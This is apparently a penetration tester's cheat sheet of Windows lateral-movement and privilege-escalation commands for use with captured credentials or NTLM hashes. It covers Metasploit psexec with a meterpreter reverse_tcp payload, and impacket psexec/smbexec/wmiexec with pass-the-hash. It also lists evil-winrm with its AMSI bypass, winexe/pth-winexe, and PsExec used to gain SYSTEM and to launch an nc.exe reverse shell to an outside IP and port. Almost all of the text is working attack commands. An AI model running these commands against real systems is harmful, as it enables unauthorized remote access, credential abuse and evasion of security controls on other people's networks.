# privesc tools

## check if win-logon-creds are working

Note: psexec & evil-winrm uses port:5985 (powershell remote access)

### msf

* `use exploit/windows/smb/psexec`
    * `set PAYLOAD windows/x64/meterpreter/reverse_tcp`
    * `SHOW TARGETS` > `set TARGET X`
* `use exploit/windows/smb/psexec_psh`

### psexec | smbexec | wmiexec

NOTE: psexec, smbexec will give SYSTEM shell. wmiexec will give user shell.

```bash
impacket-psexec DOMAIN/USER:['PASS']@IP [-hashes :NTLMHASH]
impacket-smbexec DOMAIN/USER:['PASS']@IP [-hashes :NTLMHASH]
impacket-wmiexec DOMAIN/USER:['PASS']@IP [-hashes :NTLMHASH]
```

### evil-winrm

```bash
# only USER, no DOMAIN needed
evil-winrm -i IP -u <USER> [-H NT-HASH | -p PASS]

# custom options
PS> menu
[+] Dll-Loader
[+] Donut-Loader
[+] Invoke-Binary
[+] Bypass-4MSI
[+] services
[+] upload
[+] download
```

### winexe

```bash
winexe -U 'DOMAIN/USER%PASS' //IP cmd.exe
```

### pth-winexe

```bash
pth-winexe -U 'DOMAIN/USER%HASH' //IP cmd.exe
# --system needs local admin hash
pth-winexe [--system] -U 'administrator%NTLM:HASH' //IP cmd.exe
```

## PsExec.exe

```bash
PS> .\PsExec64.exe -accepteula -i -s SHELL.exe
# i: Run process interactively
# s: Run remote process in the System account.

> PSExec64.exe -i -u "nt authority\local service" SHELL.exe
# u: Run process as user-account <>

# Run executable with a different user:pass
PS> .\PsExec.exe -accepteula -u USER -p PASS nc.exe IP PORT -e cmd.exe
```
